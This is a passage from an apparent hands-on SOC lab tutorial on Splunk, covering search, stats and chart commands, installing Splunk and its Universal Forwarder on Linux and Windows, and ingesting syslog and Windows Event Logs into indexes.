| **Max** | It will return the maximum value from the specific field. | stats max(field_name) | stats max(user_age) |
| **Min** | It will return the minimum value from the specific field. | stats min(field_name) | stats min(product_price) |
| **Sum** | It will return the sum of the fields in a specific value. | stats sum(field_name) | stats sum(product_cost) |
| **Count** | The count command returns the number of data occurrences. | stats count(function) AS new_NAME | stats count(source_IP) |

**Splunk Chart Commands**

These
 are very important types of transforming commands that are used to 
present the data in table or visualization form. Most of the chart 
commands utilize various stat commands.

# Chart

| **Command** | **chart** |
| --- | --- |
| **Explanation** | The chart command is used to transform the data into tables or visualizations. |
| **Syntax** | | chart <function> |
| **Example** | | `chart count by User` |

**Search Query:** `index=windowslogs | chart count by User`

# Timechart

| **Command** | **timechart** |
| --- | --- |
| **Explanation** | The
 timechart command returns the time series chart covering the field 
following the function mentioned. Often combined with STATS commands. |
| **Syntax** | | timechart function  <field_name> |
| **Example** | | `timechart count by Image` |

The following query will display the Image chart based on the time.

**Search Query:**

```
index=windowslogs | timechart count by Image
```

**Setting up A SOC Lab**

                            

Splunk supports all major OS versions, has very straightforward steps to 
install, and can be up and running in less than 10 minutes on any 
platform. In this task, we will only focus on installing Splunk 
Enterprise on the Linux host. Typically, we would create an account on [splunk.com](https://www.splunk.com/) and go to this [Splunk Enterprise](https://www.splunk.com/en_us/download/splunk-enterprise.html?locale=en_us) download link to select the installation package for the latest version. As of the time of writing, **9.0.3** is the newest version available on its website.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2877a97b94aa31b1cce6420b7422c90c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2877a97b94aa31b1cce6420b7422c90c.png)

**Note:** Users are not expected to create an account and download the Splunk Enterprise during this activity. All required executables are already downloaded in relevant paths.

# Connect with the Lab

This task will explore installing and configuring Splunk on a Linux machine. Connect with the lab by pressing the **Start Machine** button at the top of this task, and it will start in **Split Screen View** on the right side of the screen. In case the VM
 is not visible, use the blue Show Split View button at the top-right of
 the page. It will take around 3-5 minutes to load fully.

For the sake of simplicity, the Splunk installer is already downloaded at the location `~/Downloads/splunk`

Splunk setup

```
ubuntu@coffely:~/Downloads/splunk/$ lssplunk_installer.tgz splunkforwarder.tgz
```

**Note:** Make sure, to run `sudo su` to change to the root user before applying commands.

Splunk Lab

```
ubuntu@coffely:~/Downloads/splunk/$ sudo suroot@coffely:~/Downloads/splunk/$
```

**Splunk Installation**

Splunk installation is as simple as running a command. You will need to uncompress Splunk by running the following command.

Splunk Installation

```
root@coffely:~/Downloads/splunk/$ tar xvzf splunk_installer.tgzsplunk/
splunk/splunk-9.0.3-dd0128b1f8cd-linux-2.6-x86_64-manifest
splunk/swidtag/
splunk/swidtag/splunk-Splunk-Enterprise-primary.swidtag
splunk/ftr
splunk/openssl/
....
....
....
splunk/etc/splunk-enttrial.lic
splunk/etc/splunk-launch.conf.default
splunk/etc/findlogs.ini
splunk/etc/log-cmdline.cfg
splunk/etc/deployment-apps/
splunk/etc/deployment-apps/README
splunk/etc/searchLanguage.xml
splunk/etc/log-debug.cfg
splunksetup

```

After the installation is complete, a new folder named `splunk` will be created, as shown below. Let's now move this folder to the `/opt/` directory and start working on Splunk from there.

Splunk setup

```
root@coffely:~/Downloads/splunk/$ lssplunk splunk_installer.tgz splunkforwarder.tgz
root@coffely:~/Downloads/splunk/$ mv splunk /opt/
```

# Starting

The above step unzips the Splunk installer and installs all the necessary binaries and files on the system. Once installed, go to the directory `/opt/splunk/bin` and run the following command to start Splunk `./splunk start --accept-license`. As it is the first time we are starting the Splunk instance, it will ask the user for admin credentials. Create a user account and proceed.

Splunk Installation

```
 root@coffely:~/Downloads/splunk/# cd /opt/splunk/bin
root@coffely:/opt/splunk/bin#./splunk start --accept-licenseThis appears to be your first time running this version ofSplunk.

Splunk software must create an administrator account during startup. Otherwise, you cannot log in.
Create credentials for the administrator account.
Characters do not appear on the screen when you type in credentials.

Please enter an administrator username: splunkadmin
Password must contain at least:
   * 8 total printable ASCII character(s).
Please enter a new password:
Please confirm new password:
....
....
....
Waiting for web server at http://127.0.0.1:8000 to be available............... Done

If you get stuck, we're here to help.
Look for answers here: http://docs.splunk.com

The Splunk web interface is at http://coffely:8000

```

# Accessing

Congrats! - We successfully installed Splunk
 on our Linux machine, which took us less than 10 minutes. To access 
Splunk, open the browser within the VM and go to the address `http://coffely:8000`. If you are connected to the VPN, you can access Splunk right in your browser by going to the address. `http://MACHINE_IP:8000`.

Use the credentials you created during the installation to access the Splunk dashboard.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f2e3742660e69ec38c9d22ab57007202.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f2e3742660e69ec38c9d22ab57007202.png)

Explore the different Splunk apps on the left panel. We will explore them further in the coming tasks.

**Splunk: Interacting with CLI**

Now that we have installed Splunk,
 it's important to learn some key commands while interacting with Splunk
 instances through CLI. These commands are run from the `/opt/splunk/` directory. It is important to note that we can use the same commands on different platforms.

Some important and commonly used commands are shown below:

# Command: splunk start

The `splunk start` command is used to start the Splunk
 server. This command starts all the necessary Splunk processes and 
enables the server to accept incoming data. If the server is already 
running, this command will have no effect.

Splunk start

```
root@coffely:/opt/splunk#./bin/splunk startSplunk> Finding your faults, just like mom.
....
Checking prerequisites...
	Checking http port [8000]: open
	Checking mgmt port [8089]: open
	Checking appserver port [127.0.0.1:8065]: open
	Checking kvstore port [8191]: open
	Checking configuration... Done.
....
....
The Splunk web interface is at http://coffely:8000

```

As mentioned in the output, the

Splunk

dashboard will be accessible within the VM at

```
HTTP://coffely:8000
```

# Command: splunk stop

The `splunk stop` command is used to stop the Splunk
 server. This command stops all the running Splunk processes and 
disables the server from accepting incoming data. If the server is not 
running, this command will have no effect.

Splunk stop

```
root@tryhackme:/opt/splunk#./bin/splunk stop ...some output ommitted ...
```

# Command: splunk restart

The `splunk restart` command is used to restart the Splunk
 server. This command stops all the running Splunk processes and then 
starts them again. This is useful when changes have been made to the 
Splunk configuration files or when the server needs to be restarted for 
any other reason.

splunk: restart

```
root@tryhackme:/opt/splunk#./bin/splunk restart...some output ommitted ...
```

# Command: splunk status

The `splunk status` command is used to check the status of the Splunk
 server. This command will display information about the current state 
of the server, including whether it is running or not, and any errors 
that may be occurring.

Splunk: Start

```
root@coffely:/opt/splunk#./bin/splunk statussplunkd is running (PID: 2158).
splunk helpers are running (PIDs: 2159 2301 2351 2437).
```

# Command: splunk add oneshot

The `splunk add oneshot` command is used to add a single event to the Splunk index. This is useful for testing purposes or for adding individual events that may not be part of a larger data stream.

splunk: add oneshot

```
root@coffely:/opt/splunk#./bin/splunk add oneshot...some output ommitted ...
```

# Command: splunk search

The `splunk search` command is used to search for data in the Splunk
 index. This command can be used to search for specific events, as well 
as to perform more complex searches using Splunk's search language.

Splunk: search

```
root@coffely:/opt/splunk#./bin/splunk search coffely WARNING: Server Certificate Hostname Validation is disabled. Please see server.conf/[sslConfig]/cliVerifyServerName for details.
Feb 18 21:09:04 coffley ubuntu: coffely-has-the-best-coffee-in-town
Feb 18 13:48:17 coffely ubuntu: COFFELY
Feb 18 13:48:17 coffely ubuntu: COFFELY

```

# Command: splunk help

The most important command is the help command which provides all the help options.

splunk HELP Command

```
root@tryhackme:/opt/splunk#./bin/splunk helpWelcome to Splunk's Command Line Interface (CLI).

    Type these commands for more help:

        help [command]             type a command name to access its help page
        help [object]              type an object name to access its help page
        help [topic]               type a topic keyword to get help on a topic
        help commands              display a full list of CLI commands
        help clustering            commands that can be used to configure the clustering setup
        help shclustering          commands that can be used to configure the Search Head Cluster setup
        help control, controls     tools to start, stop, manage Splunk processes
        help datastore             manage Splunk's local filesystem use
        help distributed           manage distributed configurations such as
                                   data cloning, routing, and distributed search
        help forwarding            manage deployments
        help input, inputs         manage data inputs
        help licensing             manage licenses for your Splunk server
        help settings              manage settings for your Splunk server
        help simple, cheatsheet    display a list of common commands with syntax
        help tools                 tools to help your Splunk server
        help search                help with Splunk searches
        ....
        ....

```

These are just a few of the many CLI commands available in Splunk. 
Administrators can use the CLI to manage and configure their Splunk 
servers more efficiently and effectively.

**Splunk: Data Ingestion**

Configuring data ingestion is an important part of Splunk.
 This allows for the data to be indexed and searchable for the analysts.
 Splunk accepts data from various log sources like Operating System 
logs, Web Applications, Intrusion Detection logs, Osquery logs, etc. In 
this task, we will use Splunk Forwarder to ingest the Linux logs into 
our Splunk instance.

# Splunk Forwarders

Splunk has two primary types of forwarders that can be used in different use cases. They are explained below:

**Heavy Forwarders**

Heavy
 forwarders are used when we need to apply a filter, analyze or make 
changes to the logs at the source before forwarding it to the 
destination. In this task, we will be installing and configuring 
Universal forwarders.

**Universal Forwarders**

It is a lightweight agent that gets installed on the target host, and its main purpose is to get the logs and send them to the Splunk
 instance or another forwarder without applying any filters or indexing.
 It has to be downloaded separately and has to be enabled before use. In
 our case, we will use a universal forwarder to ingest logs.

Universal forwarders can be downloaded from the official [Splunk website](https://www.splunk.com/en_us/download/universal-forwarder.html?locale=en_us). It supports various OS, as shown below:

**Note:** As of writing this, 9.0.3 is the latest version available on the Splunk site.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b97173a010a680ebe268fe4f884564fe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b97173a010a680ebe268fe4f884564fe.png)

For this task, the 64-bit version of Linux Forwarder is already downloaded in the folder `~/Downloads/splunk`.

splunk: Forwarder

```
ubuntu@coffely:~/Downloads/splunk# lssplunk_installer.tgz splunkforwarder.tgz

```

# Install Forwarder

Change the user to sudo, unpack, and install the forwarder with the following command.

splunk: Forwarder

```
ubuntu@coffely:~/Downloads/splunk# sudo suroot@coffely:/home/ubuntu/Downloads/splunk# tar xvzf splunkforwarder.tgzsplunkforwarder/
splunkforwarder/swidtag/
splunkforwarder/swidtag/splunk-UniversalForwarder-primary.swidtag
splunkforwarder/ftr
splunkforwarder/openssl/
...
...
splunkforwarder/etc/deployment-apps/
splunkforwarder/etc/deployment-apps/README
splunkforwarder/etc/log-debug.cfg

```

The above command will install all required files in the folder

```
splunkforwarder
```

. Next, we will move this folder to

```
/opt/
```

path with the command

```
mv splunkforwarder /opt/
```

.

We will run the Splunk forwarder instance now and provide it with the new credentials as shown below:

Splunk Installation

```
root@coffey:~/Downloads/splunk# mv splunkforwarder /opt/root@coffey:~/Downloads/splunk# cd /opt/splunkforwarderroot@coffey:/opt/splunkforwarder# ./bin/splunk start --accept-licenseThis appears to be your first time running this version ofSplunk.
...
...
Please enter an administrator username: splunkadmin
Password must contain at least:
   * 8 total printable ASCII character(s).
Please enter a new password:
Please confirm new password:
Creating unit file...
Failed to auto-set default user.
...
...
Checking prerequisites...
	Checking mgmt port [8089]: not available
ERROR: mgmt port [8089] - port is already bound.  Splunk needs to use this port.
Would you like to change ports? [y/n]: y
Enter a new mgmt port: 8090
Setting mgmt to port: 8090
The server's splunkd port has been changed.
	Checking mgmt port [8090]: open
Starting splunk server daemon (splunkd)...
Done

```

By default, Splunk
 forwarder runs on port 8089. If the system finds the port unavailable, 
it will ask the user for the custom port. In this example, we are using 
8090 for the forwarder.

Splunk Forwarder is up and running but does not know what data to send and where. This is what we are going to configure next.

**Configuring Forwarder on Linux**

Now that we have 
installed the forwarder, it needs to know where to send the data. So we 
will configure it on the host end to send the data and configure Splunk so that it knows from where it is receiving the data.

# Splunk

Log into Splunk and Go to Settings -> Forward and receiving tab as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5be56ab5768301a6f8b9eaaa91ffd581.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5be56ab5768301a6f8b9eaaa91ffd581.png)

It will show multiple options to configure both forwarding and receiving. As we want to receive data from the Linux endpoint, we will click on **Configure receiving** and then proceed by configuring a new receiving port.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/64c55412514e56c05b91b8f9c4ba6060.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/64c55412514e56c05b91b8f9c4ba6060.png)

By default, the Splunk instance receives data from the forwarder on the port `9997`. It's up to us to use this port or change it. For now, we will configure our Splunk to start **listening on port 9997** and **Save**, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9a3f504672c0c499da3b5ab348b55a1f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/9a3f504672c0c499da3b5ab348b55a1f.png)

Our listening port 9997 is now enabled and waiting for the data. If we want, we can delete this entry by clicking on the `Delete` option under the `Actions` column.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2c3f58c3f084cef145523820ac3c35f9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/2c3f58c3f084cef145523820ac3c35f9.png)

# Creating Index

Now
 that we have enabled a listening port, the important next step is to 
create an index that will store all the receiving data. If we do not 
specify an index, it will start storing received data in the default 
index, which is called the `main` index.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/525a1c69e54f9c53586dce9ab7e4f737.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/525a1c69e54f9c53586dce9ab7e4f737.png)

The
 indexes tab contains all the indexes created by the user or by default.
 This shows some important metadata about the indexes like Size, Event 
Count, Home Path, Status, etc.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/452a24902c85e7793953d7e72534502b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/452a24902c85e7793953d7e72534502b.png)

Click the **New Index** button, fill out the form, and click **Save** to create the index. Here we have created an index called `Linux_host` as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b69a6dcf0bc5538e1ca56bf58763779c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b69a6dcf0bc5538e1ca56bf58763779c.png)

# Configuring Forwarder

It's time to configure the forwarder to ensure it sends the data to the right destination. Back in the Linux host terminal, go to the `/opt/splunkforwarder/bin` directory:

Splunk: Forwarder

```
root@coffely:/opt/splunkforwarder/bin# ./splunk add forward-server 10.10.169.203:9997WARNING: Server Certificate Hostname Validation is disabled. Please see server.conf/[sslConfig]/cliVerifyServerName for details.
Splunk username: splunkadmin
Password:
Added forwarding to: 10.10.169.203:9997.

```

This command will add the forwarder server, which listens to port 9997.

# Linux

Linux stores all its important logs into the `/var/log` file, as shown below. In our case, we will ingest syslog into Splunk. All other logs can be ingested using the same method.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c9b649f6b18509635485702fc601f06f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c9b649f6b18509635485702fc601f06f.png)

Next, we will tell Splunk forwarder which logs files to monitor. Here, we tell Splunk Forwarder to monitor the `/var/log/syslog` file.

Ingest syslog file

```
root@coffely:/opt/splunkforwarder/bin# ./splunk add monitor /var/log/syslog -index Linux_hostWARNING: Server Certificate Hostname Validation is disabled. Please see server.conf/[sslConfig]/cliVerifyServerName for details.
Added monitor of '/var/log/syslog'.

```

# Exploring Inputs.conf

We can also open the **inputs.conf** file located in `/opt/splunkforwarder/etc/apps/search/local`, and look at the configuration added after the commands we used above.

Inputs.conf

```
root@coffely:/opt/splunkforwarder/etc/apps/search/local# lsinputs.conf

```

We can view the content of the `input.conf` using the cat command.

Inputs.conf

```
root@coffely:/opt/splunkforwarder/etc/apps/search/local# cat inputs.conf[monitor:///var/log/syslog]
disabled = false
index = Linux_host

```

# Utilizing Logger Utility

Logger
 is a built-in command line tool to create test logs added to the syslog
 file. As we are already monitoring the syslog file and sending all logs
 to the Splunk, the log we generate in the next step can be found with Splunk logs. To run the command, use the following command.

Logger: syslog

```
tryhackme@coffely:/opt/splunkforwarder/bin# logger "coffely-has-the-best-coffee-in-town"
```

Logger: syslog

```
tryhackme@coffely:/tryhackme@coffleylab:/opt/splunkforwarder/bin# tail -1 /var/log/syslog
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/bc95b067dfb4addc351782d7dfe4cbdd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/bc95b067dfb4addc351782d7dfe4cbdd.png)

Great, We have successfully installed and configured Splunk Forwarder to get the logs fom the syslog file into Splunk.

**Splunk: Installing on Windows**

Installing Splunk on a Windows platform is relatively simple with just running the installer. Connect with the Windows Machine by clicking the `Start Machine` button on the right. It will take around 3-5 minutes to boot completely and will start in **Split-Screen View** on the right side of the screen. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.

On the Windows machine, we will first install Splunk, configure a forwarder to capture Windows Event logs, and integrate `Coffely` weblogs to collect all requests and responses into Splunk Instance.

# Downloading Enterprise

The first step would be to log in to the Splunk portal and download the Splunk Enterprise instance from the website, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5ed8e1ef1ea00799733b58549c5a925b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5ed8e1ef1ea00799733b58549c5a925b.png)

The installer Splunk-Instance is already been downloaded and placed in the `Downloads` folder to speed up the process.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b525f9ccf32ae135525304ac8f693557.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b525f9ccf32ae135525304ac8f693557.png)

Run the `Splunk-Instance` installer. By default, it will install Splunk in the folder `C:\Program Files\Splunk`. This will check the system for dependencies and will take 5-8 minutes to install the Splunk instance.

First, click the **Check this box to accept the License Agreement** and click **Next**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/aeff1a79db4e62e61a97f9ee612c7c55.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/aeff1a79db4e62e61a97f9ee612c7c55.png)

# Create Administration Account

The
 important step during installation is creating an administrator 
account, as shown below. This account will have high privileges, create 
and manage other accounts, and control all administrative roles.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3ebfcc3f4a2f48356ebbe987abaf9796.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/3ebfcc3f4a2f48356ebbe987abaf9796.png)

It will look for the system requirement for compatibility and other checks.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/58bd917c04524e963db6853078fc46b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/58bd917c04524e963db6853078fc46b9.png)

We will get the following message if all system requirements are met, and installation is complete.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c4db4c0b5fd17c0d287dc270619580dc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c4db4c0b5fd17c0d287dc270619580dc.png)

# Accessing Instance

Splunk is installed on port `8000` by default. We can change the port during the installation process as well. Now open the browser in the lab and go to the URL `HTTP://127.0.0.1:8000`. If you are connected with the VPN, then you can also access the newly installed Splunk Instance in your browser by going to  `HTTP://MACHINE_IP:8000`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/721ff9c0f684779dcee3a95ebb6010f0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/721ff9c0f684779dcee3a95ebb6010f0.png)

Use the credentials created during the installation process to get the Splunk dashboard.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d3d386978ab713e99144ab4131e16229.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d3d386978ab713e99144ab4131e16229.png)

Great. We have successfully installed Splunk on a Windows OS. In the next task, we will follow similar steps we did during Linux Lab to install Splunk Forwarder.

**Installing and Configuring Forwarder**

First, we will configure the receiver on Splunk so the forwarder knows where to send the data.

# Configure Receiving

Log into Splunk and Go to Settings -> Forward and receiving tab as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0f7b0ea014b250e34c50e9eadacd2e90.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0f7b0ea014b250e34c50e9eadacd2e90.png)

It will show multiple options to configure both forwarding and receiving. As we want to receive data from the Windows Endpoint, we will click on **Configure receiving** and then proceed by configuring a new receiving port.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c6ed21adbe533ae0b62ecc1549aa07cd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c6ed21adbe533ae0b62ecc1549aa07cd.png)

By default, the Splunk instance receives data from the forwarder on port `9997`.
 It's up to us to use this port or change it. For now, we will configure
 our Splunk to start listening on port 9997 and **Save**, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5f8547e6cc1db7fe8c154125fd9dbf57.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5f8547e6cc1db7fe8c154125fd9dbf57.png)

**Installing Splunk Forwarder**

Installing Splunk Forwarder is very straightforward. First, we will download the latest forwarder from the official website [here](https://www.splunk.com/en_us/download.html). As of writing this, Splunk Forwarder 9.0.4 is the newest version available on the site.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/cd3e37d24fc3eddc642419628612c6a6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/cd3e37d24fc3eddc642419628612c6a6.png)

For this lab, the forwarder is already downloaded and placed in the Downloads folder, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/07fef7e7cf1635e63a8907965350b89f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/07fef7e7cf1635e63a8907965350b89f.png)

# Installation Process

Click on the installer and begin installing Splunk Forwarder, as shown below. Don't forget to click the **Check this box to accept the License Agreement**. Select the Select the **On-Premises Option** as we are installing it on an on-premises appliance.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c6df0b12d831de145b91587d3da61247.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c6df0b12d831de145b91587d3da61247.png)

Create an account for Splunk Forwarder. This will be used when connecting the Splunk forwarder to the Splunk Indexer.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e9b77f24422620244cb0a844c7bd1723.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e9b77f24422620244cb0a844c7bd1723.png)

# Setting up Deployment Server

This configuration is important if we install Splunk forwarder on multiple hosts. We can skip this step as this step is optional.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b71e007cf3baa869948d342d10996650.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b71e007cf3baa869948d342d10996650.png)

# Setting Up Listener

We must specify the server's IP address and port number to ensure that our Splunk instance gets the logs from this host. By default, Splunk listens on port `9997` for any incoming traffic.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/37467762b612abf6193b798d655afcda.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/37467762b612abf6193b798d655afcda.png)

Installing the forwarder on a Windows endpoint will take 3-5 minutes.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a16868bbb319eb9d0333644660e2cbee.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a16868bbb319eb9d0333644660e2cbee.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e56ee367b75db022b305f54f6839e483.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e56ee367b75db022b305f54f6839e483.png)

If
 we had provided the information about the deployment server during the 
installation phase, our host details would be available in the Settings 
-> Forwarder Management tab, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/dbd889863a7e203791da8b3295b31bf2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/dbd889863a7e203791da8b3295b31bf2.png)

Now that Splunk forwarder is installed, we will now configure our forwarder to send logs to our Splunk instance in the upcoming tasks.

**Splunk: Ingesting Windows Logs**

We have installed the forwarder and set up the listener on Splunk.
 It's time to configure Splunk to receive Event Logs from this host and 
configure the forwarder to collect Event Logs from the host and send 
them to the Splunk Indexer. Let's go through this step by step.

# Check Forwarder Management

The Forwarder Management tab views and configures the deployment of servers/hosts.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/846f664b8a8a4ebb560fb97e220547b1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/846f664b8a8a4ebb560fb97e220547b1.png)

Go
 to settings -> Forwarder Management tab to get the details of all 
deployment hosts. In an actual network, this tab will be filled with all
 the hosts and servers configured to send logs to Splunk Indexer.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c180ba12568b1878c38c9a448e866430.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c180ba12568b1878c38c9a448e866430.png)

It will appear here if we have properly configured the forwarder on the host. Now it's time to configure Splunk to receive the Event Logs.

# Select Forwarder

Click on Settings -> Add data. It shows all the options to add data from different sources.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7aafc3f62d618f4937e9033617b77f12.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7aafc3f62d618f4937e9033617b77f12.png)

It provides us with three options for selecting how to ingest our data. We will choose the `Forward` option to get the data from Splunk Forwarder.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b361fa4806df2ecf712688312cd1b4e2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b361fa4806df2ecf712688312cd1b4e2.png)

In the **Select Forwarders section,** Click on the host `coffelylab` shown in the Available host(s) tab, and it will be moved to the Selected host(s) tab. Then, click Next.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d3287bc6d57de2ad81be3688bc4f28ac.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d3287bc6d57de2ad81be3688bc4f28ac.png)

**Select Source**

It's
 time to select the log source that we need to ingest. The list shows 
many log sources to choose from. Click on Local Event Logs to configure 
receiving Event Logs from the host. Different Event Logs will appear in 
the list to choose from. As we know, various Event Logs are generated by
 default on the Windows host. More about Event Logs can be learned in 
this

[Windows Event Logs](https://tryhackme.com/room/windowseventlogs)

room. Let's select a few of those and move to the next step.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/46f4a32438800393030eade6eee7f21c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/46f4a32438800393030eade6eee7f21c.png)

# Creating Index

Create an index that will store the incoming Event logs. Once created, select the Index from the list and move to the next step.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/ad8db61e06b6f3a5847cb70d96267fa8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/ad8db61e06b6f3a5847cb70d96267fa8.png)

# Review

The review tab summarizes the settings we just did to configure Splunk. Move to the next step.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c0f5d5a4e74e03cba6621d73f9c6c4ce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/c0f5d5a4e74e03cba6621d73f9c6c4ce.png)

Click on the **Start Searching** tab. It will take us to the Search App. If everything goes smoothly, we will receive the Event Logs immediately.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/462f4fafe7eca7399709bf8bdc5b81c5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/462f4fafe7eca7399709bf8bdc5b81c5.png)

Great. We have successfully configured Splunk to receive Event Logs from the Windows host. Let's move on to the next task, where we will look at the steps to ingest weblogs.

**Ingesting Coffely Web Logs**

